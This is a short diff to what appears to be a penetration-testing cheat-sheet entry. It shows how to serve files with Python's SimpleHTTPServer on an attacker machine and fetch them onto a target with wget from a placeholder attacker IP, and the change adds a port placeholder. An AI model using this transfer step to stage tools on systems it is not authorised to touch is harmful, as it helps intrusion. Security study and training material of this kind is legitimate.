@@ -1,7 +1,7 @@
 Python SimpleHTTPServer
 
 #on Attacker
-python -m SimpleHTTPServer
+python -m SimpleHTTPServer <a port number>
 
 #on target
 wget <attackerip>:8000/filename
